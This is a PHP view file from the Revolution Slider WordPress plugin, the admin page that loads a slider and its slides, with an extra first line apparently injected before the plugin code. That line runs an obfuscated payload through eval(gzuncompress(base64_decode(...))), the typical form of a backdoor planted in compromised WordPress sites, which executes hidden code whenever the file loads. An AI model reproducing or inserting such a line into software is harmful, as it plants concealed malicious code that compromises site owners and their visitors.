<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
if( !defined( 'ABSPATH') ) exit();

$operations = new RevSliderOperations();

$sliderID = self::getGetVar("id");

if(empty($sliderID))
	RevSliderFunctions::throwError("Slider ID not found"); 

$slider = new RevSlider();
$slider->initByID($sliderID);
$sliderParams = $slider->getParams();

$arrSliders = $slider->getArrSlidersShort($sliderID);
$selectSliders = RevSliderFunctions::getHTMLSelect($arrSliders,"","id='selectSliders'",true);

$numSliders = count($arrSliders);

//set iframe parameters	
$width = $sliderParams["width"];
$height = $sliderParams["height"];

$iframeWidth = $width+60;
$iframeHeight = $height+50;

$iframeStyle = "width:".$iframeWidth."px;height:".$iframeHeight."px;";

if($slider->isSlidesFromPosts()){
	$arrSlides = $slider->getSlidesFromPosts(false);
}elseif($slider->isSlidesFromStream()){
	$arrSlides = $slider->getSlidesFromStream(false);
}else{
	$arrSlides = $slider->getSlides(false);
}

$numSlides = count($arrSlides);

$linksSliderSettings = self::getViewUrl(RevSliderAdmin::VIEW_SLIDER,'id='.$sliderID);

//treat in case of slides from gallery
if($slider->isSlidesFromPosts() == false){
	//removed in 5.0
}else{	//slides from posts
	//removed in 5.1.7
}
?>